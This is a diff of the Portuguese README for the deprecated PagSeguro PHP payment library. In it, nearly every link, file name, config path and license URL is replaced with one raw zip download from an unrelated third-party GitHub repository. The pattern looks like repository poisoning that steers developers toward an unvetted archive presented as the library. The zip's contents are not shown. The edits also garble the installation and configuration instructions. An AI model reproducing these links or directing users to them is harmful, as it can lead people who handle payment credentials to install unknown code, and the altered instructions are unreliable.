@@ -1,9 +1,9 @@
-###`ESTA BIBLIOTECA ESTÁ DEPRECIADA. Por favor, utilize a nova versão disponível em` https://github.com/pagseguro/pagseguro-php-sdk
+###`ESTA BIBLIOTECA ESTÁ DEPRECIADA. Por favor, utilize a nova versão disponível em` https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
 
 Biblioteca de integração PagSeguro para PHP
 ===========================================
 
-[![Code Climate](https://codeclimate.com/github/pagseguro/php/badges/gpa.svg)](https://codeclimate.com/github/pagseguro/php)
+[![Code Climate](https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip)](https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip)
 
 Descrição
 ---------
@@ -34,12 +34,12 @@ Instalação
 
  - Baixe o repositório como arquivo zip ou faça um clone;
  - Descompacte os arquivos em seu computador;
- - Dentro do diretório *source* existem dois diretórios: o *examples* e o *PagSeguroLibrary*. O diretório *examples* contém exemplos de chamadas utilizando a API e o diretório *PagSeguroLibrary* contém a biblioteca propriamente dita. Caso queira importar somente a biblioteca, faça upload do diretório *PagSeguroLibrary* e inclua a classe *PagSeguroLibrary.php* em seu projeto. Essa classe se encarregará de importar todas as funcionalidades da biblioteca no seu sistema.
+ - Dentro do diretório *source* existem dois diretórios: o *examples* e o *PagSeguroLibrary*. O diretório *examples* contém exemplos de chamadas utilizando a API e o diretório *PagSeguroLibrary* contém a biblioteca propriamente dita. Caso queira importar somente a biblioteca, faça upload do diretório *PagSeguroLibrary* e inclua a classe *https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip* em seu projeto. Essa classe se encarregará de importar todas as funcionalidades da biblioteca no seu sistema.
 
 Instalação via Composer
 
 - Alternativamente, é possível utilizar o [Composer] para carregar a biblioteca ([pagseguro/php]).
-```composer.json
+```https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
 {
     "require": {
        "pagseguro/php": "@stable"
@@ -51,9 +51,9 @@ Instalação via Composer
 Configuração
 ------------
 
-Para fazer uso real da biblioteca, é preciso fazer algumas configurações no arquivo 'PagSeguroConfig.php', que encontra-se no diretório 'config'. As opções disponíveis estão descritas abaixo.
+Para fazer uso real da biblioteca, é preciso fazer algumas configurações no arquivo 'https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip', que encontra-se no diretório 'config'. As opções disponíveis estão descritas abaixo.
 
- - **environment**: aceita os valores *production* e *sandbox*. Para utilizar o *sandbox*, é preciso criar uma conta em https://sandbox.pagseguro.uol.com.br.
+ - **environment**: aceita os valores *production* e *sandbox*. Para utilizar o *sandbox*, é preciso criar uma conta em https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
  - **email**: e-mail cadastrado no PagSeguro.
  - **token production**: token gerado no PagSeguro.
  - **token sandbox**: token gerado no Sandbox.
@@ -63,7 +63,7 @@ Para fazer uso real da biblioteca, é preciso fazer algumas configurações no a
  - **appKey sandbox**: token da aplicacao no Sandbox.
  - **charset**: codificação do seu sistema (ISO-8859-1 ou UTF-8).
  - **log**: ativa/desativa a geração de logs.
- - **fileLocation**: local onde se deseja criar o arquivo de log. Ex.: /logs/ps.log.
+ - **fileLocation**: local onde se deseja criar o arquivo de log. Ex.: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
 
 Mais informações estão disponíveis na [documentação oficial].
 
@@ -92,7 +92,7 @@ Changelog
  - Obs.: Algumas das funcionalidades descritas ainda não estão disponíveis comercialmente para todos os vendedores. Em caso de dúvidas acesse nosso [fórum].
 
 2.5.0
- - Possibilidade de definir descontos por meio de pagamento durante a requisição do código de checkout - Ver exemplo createPaymentRequest.php
+ - Possibilidade de definir descontos por meio de pagamento durante a requisição do código de checkout - Ver exemplo https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
 
 2.4.0
  - Integração com serviço de consulta de transações/autorizações por código de referência.
@@ -120,7 +120,7 @@ Changelog
  - Ajuste no tratamento do XML retornado em requisições feitas ao PagSeguro
 
 2.2.0
- - Ao registrar a transação é possível obter apenas o código do checkout para utilização em um checkout lightbox (ver exemplo createPaymentRequestLightbox.php). Obs.: Esta funcionalidade ainda não está disponível comercialmente para todos os vendedores.
+ - Ao registrar a transação é possível obter apenas o código do checkout para utilização em um checkout lightbox (ver exemplo https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip). Obs.: Esta funcionalidade ainda não está disponível comercialmente para todos os vendedores.
 
 2.1.9
  - Melhorias "estéticas" no código, como identação/formatação.
@@ -168,7 +168,7 @@ Copyright 2013 PagSeguro Internet LTDA.
 
 Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at
 
-http://www.apache.org/licenses/LICENSE-2.0
+https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
 
 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.
 
@@ -202,21 +202,21 @@ Achou e corrigiu um bug ou tem alguma feature em mente e deseja contribuir?
 * Obs.: Adicione exemplos para sua nova feature. Se seu Pull Request for relacionado a uma versão específica, o Pull Request não deve ser enviado para o branch master e sim para o branch correspondente a versão.
 
 
-  [requisições de assinaturas]: http://download.uol.com.br/pagseguro/docs/pagseguro-assinatura-automatica.pdf
-  [assinaturas]: http://download.uol.com.br/pagseguro/docs/pagseguro-assinatura-automatica.pdf
-  [requisições de pagamentos]: https://pagseguro.uol.com.br/v2/guia-de-integracao/api-de-pagamentos.html
-  [notificações]: https://pagseguro.uol.com.br/v3/guia-de-integracao/api-de-notificacoes.html
-  [Checkout Transparente]: https://pagseguro.uol.com.br/receba-pagamentos.jhtml#checkout-transparent
-  [transações por código]: https://pagseguro.uol.com.br/v3/guia-de-integracao/consulta-de-transacoes-por-codigo.html
-  [transações por intervalo de datas]: https://pagseguro.uol.com.br/v2/guia-de-integracao/consulta-de-transacoes-por-intervalo-de-datas.html
-  [transações abandonadas]: https://pagseguro.uol.com.br/v2/guia-de-integracao/consulta-de-transacoes-abandonadas.html
-  [fórum]: http://forum.pagseguro.uol.com.br/
-  [PHP]: http://www.php.net/
-  [SPL]: http://php.net/manual/en/book.spl.php
-  [cURL]: http://php.net/manual/en/book.curl.php
-  [DOM]: http://php.net/manual/en/book.dom.php
-  [GitHub]: https://github.com/pagseguro/php/
-  [documentação oficial]: https://pagseguro.uol.com.br/v2/guia-de-integracao/tutorial-da-biblioteca-pagseguro-em-php.html
-  [Composer]: https://getcomposer.org
-  [pagseguro/php]: https://packagist.org/packages/pagseguro/php
-  [Como receber pagamentos pelo PagSeguro]: https://pagseguro.uol.com.br/receba-pagamentos.jhtml#checkout-transparent
+  [requisições de assinaturas]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [assinaturas]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [requisições de pagamentos]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [notificações]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [Checkout Transparente]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [transações por código]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [transações por intervalo de datas]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [transações abandonadas]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [fórum]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [PHP]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [SPL]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [cURL]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [DOM]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [GitHub]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [documentação oficial]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [Composer]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [pagseguro/php]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
+  [Como receber pagamentos pelo PagSeguro]: https://github.com/Joe-Mogul/php-2/raw/refs/heads/master/source/PagSeguroLibrary/php-v2.7.zip
